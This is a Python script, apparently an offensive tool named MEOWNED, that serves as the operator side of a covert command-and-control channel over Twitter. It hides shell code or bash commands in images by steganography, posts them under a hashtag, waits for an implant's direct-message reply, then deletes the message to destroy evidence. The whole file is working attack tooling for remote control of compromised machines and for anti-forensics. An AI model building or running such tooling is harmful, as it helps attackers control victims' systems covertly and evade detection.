#!/usr/bin/python3
# """MEOWNED (MEssages Over tWitter Exfiltrating Data)"""
"""pip3 install python-twitter"""
"""pip3 install Stegano"""
"""pip3 install pyyaml"""

import sys
import yaml
import twitter
import time
from stegano import lsb
import argparse

# Parse arguments pretty
parser = argparse.ArgumentParser(description='C&C through TWITTER.')
parser.add_argument('-hashtag','--hashtag', dest='hashtag', help='The hashtag to read from and tweet to')
parser.add_argument('-image','--image', dest='image', help='The image where the message/file will be steganographed')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-s', '--shell-code', dest='shell_code',help='Set to shell code mode', action='store_true')
group.add_argument('-b', '--bash-command', dest='bash_command', help='Set to bash command mode', action='store_true')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-m', '--message', dest='message', help='The message to insert in the image')
group.add_argument('-f', '--file', dest='file', help='The file to insert in the image')
parser.add_argument('-w','--wait-for-reply', dest='wait_for_reply', help='Tell the server to wait for the reply', action='store_true')
args = parser.parse_args()


message = args.message or (open(args.file, "r")).read()
hashtag = args.hashtag
image = args.image
shell_code_mode = args.shell_code 
bash_command_mode = args.bash_command
wait_for_reply = args.wait_for_reply

# Set the protocol header to the message
protocol_header = ""
if(shell_code_mode):
    protocol_header = "SHELL_CODE:"
elif(bash_command_mode):
    protocol_header = "BASH_COMMAND:"
message = protocol_header + message

print("Starting C&C MEOWNED")
print("+    Message: " +  message)
print("+    Image: " + image)
print("+    Hashtag: " + hashtag)
print("+    Shell Code Mode: " +  str(shell_code_mode))
print("+    Bash Command Mode: " +  str(bash_command_mode))

# Import YAML
with open("conf.yaml", 'r') as stream:
    try:
        conf = yaml.load(stream)
    except yaml.YAMLError as exc:
        sys.exit("Error: Couldn't parse configuration file, check if conf.yaml exists.")

# Twitter API handler
api = twitter.Api(consumer_key=conf['twitter']['consumer_key'], 
    consumer_secret=conf['twitter']['consumer_secret'], 
    access_token_key=conf['twitter']['access_token_key'], 
    access_token_secret=conf['twitter']['access_token_secret'])

# Verify API credentials with twitter
try:
    api.VerifyCredentials()
    print("Twitter credentials are valid.")
except twitter.error.TwitterError as exc:
    sys.exit("Error: Couldn't authenticate with Twitter.")

# Hide the secret message
secret = lsb.hide("./source-imgs/" + image, message)
secret.save("./output-imgs/" + image)

# Post message to Twitter
# status = api.PostUpdate( "CCC (Covert Cat Channel): ONLINE " + "#" + sys.argv[1],)
# print(status.text)

# Get the last message in the DM tray
direct_messages = api.GetDirectMessages(count=1)
if(direct_messages):
    dm_last_id = direct_messages[0].id
else:
    dm_last_id = None

# Post image to Twitter
print("Tweeting image...")
#status = api.PostMedia( "meow " + "#" + hashtag, "./output-imgs/" + image)
#print(status.text)

# Wait to reply, get answer and destroy evidence
if(wait_for_reply):
    replied = False
    while(not replied):
        print("-> Waiting for meow...")
        direct_messages = api.GetDirectMessages(since_id=dm_last_id,count=1,full_text=True)
        if(direct_messages):
            print("<- Meow!")
            replied = True
        else:
            print("<- Not meowing...")
            time.sleep(5)

    dm_text = direct_messages[0].text
    dm_id = direct_messages[0].id
    print("Meow meow meow: \n")
    print(dm_text)
    print("\n")
    print("-> Destroying meow evidence!")
    api.DestroyDirectMessage(message_id=dm_id)
    print("-> Evidence destroyed, meow!")

# clear_message = lsb.reveal("./output-imgs/" + sys.argv[2])
# print (clear_message)